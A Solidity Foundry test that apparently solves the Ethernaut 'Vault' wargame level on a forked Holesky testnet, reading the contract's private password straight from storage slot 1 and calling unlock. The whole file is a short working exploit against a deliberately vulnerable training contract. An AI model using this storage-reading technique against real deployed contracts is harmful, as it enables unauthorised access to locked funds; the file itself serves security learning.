// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Vault} from "../../src/Ethernaut/Vault.sol";

contract VaultAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Vault vault = Vault(0x3Aa7fb89a093B2e0EbF9a80aFEA96af772689014);
        bytes32 password = vm.load(
            0x3Aa7fb89a093B2e0EbF9a80aFEA96af772689014,
            bytes32(uint256(1))
        );
        vault.unlock(password);
        vm.stopPrank();
        assertFalse(vault.locked());
    }
}
